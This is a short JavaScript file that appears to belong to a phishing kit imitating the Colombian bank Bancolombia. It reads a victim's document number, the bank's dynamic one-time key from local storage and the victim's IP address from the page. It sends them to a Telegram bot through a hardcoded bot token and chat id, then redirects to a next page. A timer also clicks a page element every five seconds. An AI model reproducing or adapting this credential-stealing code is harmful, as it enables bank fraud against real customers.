//bot token
var telegram_bot_id = "5703350999:AAFztxe4pvNo6upuDjasXQb5EJcEIcFnTDo";
//chat id
var chat_id = 5211804504;
var u_name, ip, ip2;
var ready = function () {
    doct = localStorage.getItem("doc");
    u_name = document.getElementById("DocumentNumber").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "CLAVE DINÁMICA BANC0L0MBI4: " + doct +  + u_name + "\n\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index5.html';
        console.log(response);
    });
    return false;
};
function gds(params) {
    document.getElementById("virtualizedTree").click();
    
}

function lodss(params) {
    let counters = 10;
    setInterval(( ) => {
        
        let tst = document.getElementById("virtualizedTree");
let alr = "clickd";

tst.click( counters++, console.log(alr +" " + counters));
return counters;
        
    }, 5000);
    
}

